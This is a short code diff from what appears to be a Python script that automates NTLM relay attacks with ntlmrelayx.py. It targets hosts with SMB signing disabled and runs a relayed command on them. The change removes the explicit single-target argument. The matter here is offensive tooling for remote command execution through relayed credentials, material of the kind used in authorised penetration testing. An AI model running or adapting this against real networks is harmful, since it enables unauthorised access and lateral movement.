@@ -154,7 +154,7 @@ def main():
         if os.path.exists("/tmp/hosts-signing-disabled"):
             command = "ntlmrelayx.py -smb2support -tf %s -c '%s'" % ("/tmp/hosts-signing-disabled.txt", relayx_command)
         else:
-            command = "ntlmrelayx.py -smb2support -t %s -c '%s'" % (target_ip, relayx_command)
+            command = "ntlmrelayx.py -smb2support -c '%s'" % (relayx_command)
             
         #tmux_window.split_window(shell=command)
         tmux_pane = tmux_pane.split_window()
